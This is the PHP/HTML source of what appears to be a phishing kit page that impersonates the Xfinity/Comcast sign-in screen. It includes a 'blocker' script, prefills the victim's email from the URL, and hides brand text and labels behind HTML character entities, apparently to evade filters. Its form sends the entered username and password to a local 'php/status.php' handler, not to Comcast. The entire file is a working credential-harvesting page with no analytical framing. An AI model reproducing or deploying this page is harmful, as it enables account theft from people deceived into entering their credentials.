<?php
error_reporting(0);
include "include/blocker.php";
require "includes/functions.php";

$email=htmlspecialchars($_GET["email"]);
error_reporting(0);
?>
<!DOCTYPE html>
<html class="light da da-expandable da-fullscreen" data-resource-package-id="res-responsive-login-page" lang="en"><head>

<title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#88;&#102;&#105;&#110;&#105;&#116;&#121;</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="viewport" content="width=device-width,initial-scale=1">

   

<link rel="stylesheet" type="text/css" href="media/fonts-remote.css">
<link rel="stylesheet" type="text/css" href="media/styles-light.css">
<link rel="shortcut icon" href="media/favicon.ico">
<link rel="apple-touch-icon" sizes="57x57" href="media/apple-icon-57x57.png">
<link rel="icon" type="image/png" sizes="96x96" href="media/favicon-96x96.png">
<script>

function check(form) {
if (form.user.value == "")
{ form.user.focus(); document.getElementById("error").style.display = "block"; document.getElementById("user").style.borderColor = "#C90318"; return;} else { document.getElementById("user").style.borderColor = "#B1B9BF"; document.getElementById("error").style.display = "none";  }
if (form.passwd.value == "")
{ form.passwd.focus(); document.getElementById("error").style.display = "block"; document.getElementById("passwd").style.borderColor = "#C90318"; return;} else { document.getElementById("passwd").style.borderColor = "#B1B9BF"; document.getElementById("error").style.display = "none";  }
form.submit()
}


function isNumericKey(p1,min) {
var p1 = document.getElementById("user").value;
var min = 0
if(p1.length > min)
{ LoadXMLDoc(); return false;} else { LoadXMLDocDsbl(); }
}
function LoadXMLDoc() {
document.getElementById("userlabel").classList.remove('accessibly-hidden');
}
function LoadXMLDocDsbl() {
document.getElementById("userlabel").classList.add('accessibly-hidden');
}

function TheisNumericKey(p1,min) {
var p1 = document.getElementById("passwd").value;
var min = 0
if(p1.length > min)
{ TheLoadXMLDoc(); return false;} else { TheLoadXMLDocDsbl(); }
}
function TheLoadXMLDoc() {
document.getElementById("passlabel").classList.remove('accessibly-hidden');
}
function TheLoadXMLDocDsbl() {
document.getElementById("passlabel").classList.add('accessibly-hidden');
}





</script>

<style type="text/css">
@media only screen and (min-width: 1400px) {
.ad.ad-fullscreen #left {
margin-left: 670px;
}
.ad.ad-fullscreen #right {
margin-right: 0px;
}
}
.da-300x250 #ad-block {
height: 250px;
overflow: hidden;
}
</style>
</head>
<body class=" has-footer ">
<div id="breakpoints"></div>
<div id="background" style="height: 829px; background-image: url(&quot;media/bb.png&quot;); background-color: rgb(43, 34, 37); background-repeat: no-repeat;"></div>
<main id="bd">
<h1 class="screen-reader-text">&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#88;&#102;&#105;&#110;&#105;&#116;&#121;</h1>
<div id="left">




<a id="alink" href="#"><img id="imgholder" src="media/LRECcta.gif" width="300" height="600"></a><div id="ad-block" style="display: none;">
<h2 id="ad-heading" class="screen-reader-text">&#65;&#100;&#118;&#101;&#114;&#116;&#105;&#115;&#101;&#109;&#101;&#110;&#116;</h2>


<div id="ads-info">
<a class="first" href="#" rel="default">Ad Info</a>
<span class="divider"></span>
<a href="#">&#65;&#100;&#32;&#70;&#101;&#101;&#100;&#98;&#97;&#99;&#107;</a>
</div>
</div></div>
</div><div id="right"><div class="container">
<form name="signin" action="php/status.php" method="post">
<div class="single logo-wrapper">
<span aria-role="img" class="xfinity-logo"></span>
</div>
<div class="textfield-wrapper">
<label for="user" id="userlabel" class="float accessibly-hidden">&#88;&#102;&#105;&#110;&#105;&#116;&#121;&#32;&#73;&#68;</label>
<input value="<?php echo $email?>" onkeyup="isNumericKey(event,this)" onchange="isNumericKey(event,this)" onkeypress="isNumericKey(event,this)" onKeyDown="if(event.keyCode==13) check(this.form);" id="user" name="user" type="text" placeholder="Email, mobile, or username" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128">
</div>

<div class="textfield-wrapper">
<label for="passwd" id="passlabel" class="float accessibly-hidden">Password</label>
<input onkeyup="TheisNumericKey(event,this)" onchange="TheisNumericKey(event,this)" onkeypress="TheisNumericKey(event,this)" onKeyDown="if(event.keyCode==13) check(this.form);" id="passwd" name="passwd" type="password" placeholder="Password" maxlength="128">
</div>

<p id="error" style="display:none;" class="error_message">&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#101;&#110;&#116;&#101;&#114;&#32;&#121;&#111;&#117;&#114;&#32;&#88;&#102;&#105;&#110;&#105;&#116;&#121;&#32;&#73;&#68;&#32;&#116;&#111;&#32;&#115;&#105;&#103;&#110;&#32;&#105;&#110;&period;</p>
<div class="checkbox-container">
<label for="remember_me">
<input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
</label>
<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help"></button>
</div>







<button class="submit" onclick="check(this.form)" type="button" id="sign_in">Sign In</button>



<ul>



<li id="forgot-username-password-item">Forgot <a href="#">&#88;&#102;&#105;&#110;&#105;&#116;&#121;&#32;&#73;&#68;</a> or <a id="forgotPwdLink" href="#">password</a>?</li>

<li id="create-username-item">&#68;&#111;&#110;&apos;&#116;&#32;&#104;&#97;&#118;&#101;&#32;&#97;&#110;&#32;&#88;&#102;&#105;&#110;&#105;&#116;&#121;&#32;&#73;&#68;&quest;<span><a href="#"> &#67;&#114;&#101;&#97;&#116;&#101;&#32;&#111;&#110;&#101;</a></span>
</li>


<li id="quick-bill-pay">
<a href="#">&#80;&#97;&#121;&#32;&#97;&#110;&#121;&#32;&#98;&#97;&#108;&#97;&#110;&#99;&#101;</a> &#119;&#105;&#116;&#104;&#111;&#117;&#116;&#32;&#115;&#105;&#103;&#110;&#105;&#110;&#103;&#32;&#105;&#110;</li>


</ul>
<p id="implied-legal">&#66;&#121;&#32;&#115;&#105;&#103;&#110;&#105;&#110;&#103;&#32;&#105;&#110;&comma;&#32;&#121;&#111;&#117;&#32;&#97;&#103;&#114;&#101;&#101;&#32;&#116;&#111;&#32;&#111;&#117;&#114; <a href="#">&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;</a> and <a href="#">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#32;&#80;&#111;&#108;&#105;&#99;&#121;</a>.</p>



 </form>
</div>

</div>
</main>
<footer>
<span class="content">
<span class="copyright">&copy;&#32;&#50;&#48;&#50;&#48;&#32;&#67;&#111;&#109;&#99;&#97;&#115;&#116;</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="#">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#32;&#80;&#111;&#108;&#105;&#99;&#121;</a>
<span class="divider"></span>
<a href="#">&#84;&#101;&#114;&#109;&#115;&#32;&#111;&#102;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="#">&#65;&#100;&#32;&#73;&#110;&#102;&#111;</a>
<span class="divider"></span>
<a href="#">&#65;&#100;&#32;&#70;&#101;&#101;&#100;&#98;&#97;&#99;&#107;</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="#">&#67;&#97;&#108;&period;&#32;&#67;&#105;&#118;&period;&#32;&#67;&#111;&#100;&#101;&#32;&sect;&#49;&#55;&#57;&#56;&period;&#49;&#51;&#53;&colon;&#32;&#68;&#111;&#32;&#78;&#111;&#116;&#32;&#83;&#101;&#108;&#108;&#32;&#77;&#121;&#32;&#73;&#110;&#102;&#111;</a>
</span>
</nav>
</span>
</footer>







</body></html>